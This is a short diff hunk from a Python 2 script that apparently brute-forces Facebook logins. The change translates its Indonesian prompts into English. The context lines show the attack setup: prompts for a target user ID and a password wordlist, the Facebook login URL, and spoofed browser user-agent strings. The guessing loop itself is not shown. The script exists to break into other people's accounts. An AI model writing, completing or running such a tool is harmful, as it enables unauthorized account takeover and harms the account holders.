@@ -60,10 +60,10 @@ def banner():
 banner()
     
 print wd+"         https://www.github.com/7H4 "
-print GG+"╭────\033[91m[\033[96m Masukkan ID\033[95m / \033[96mUsername Target\033[91m ] "
+print GG+"╭────\033[91m[\033[96m User ID\033[95m / \033[96mUsername Target\033[91m ] "
 email_target = str(raw_input(GL+"\033[92m╰─o==[]::::::::::::::::>\033[93m  "))
 print " "
-print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[91;1m]"
+print "\033[92m╭────\033[91m[ \033[96m Password File Wordlist \033[95m( pass.txt ) \033[91;1m]"
 password_list = str(raw_input(GG+"╰─o==[]::::::::::::::::>\033[93m "))
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
